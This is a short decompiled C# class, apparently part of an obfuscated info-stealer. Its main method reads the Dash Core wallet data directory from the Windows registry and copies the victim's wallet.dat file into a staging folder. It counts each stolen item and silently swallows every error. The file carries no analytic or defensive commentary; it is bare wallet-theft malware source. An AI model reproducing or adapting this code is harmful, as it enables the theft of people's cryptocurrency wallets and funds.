using System;
using System.IO;
using Microsoft.Win32;

// Token: 0x0200005D RID: 93
internal class Class30
{
	// Token: 0x0600024D RID: 589 RVA: 0x00012BF0 File Offset: 0x00010DF0
	public static void smethod_0(string string_0)
	{
		try
		{
			using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Dash").OpenSubKey("Dash-Qt"))
			{
				try
				{
					Directory.CreateDirectory(string_0 + "\\Wallets\\DashCore\\");
					File.Copy(registryKey.GetValue("strDataDir").ToString() + "\\wallet.dat", string_0 + "\\DashCore\\wallet.dat");
					Class30.int_0++;
					Class37.int_0++;
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
	}

	// Token: 0x0600024E RID: 590 RVA: 0x0000446C File Offset: 0x0000266C
	public Class30()
	{
		Class40.gcO0h7LzslQIW();
		base..ctor();
	}

	// Token: 0x0400010B RID: 267
	public static int int_0;
}
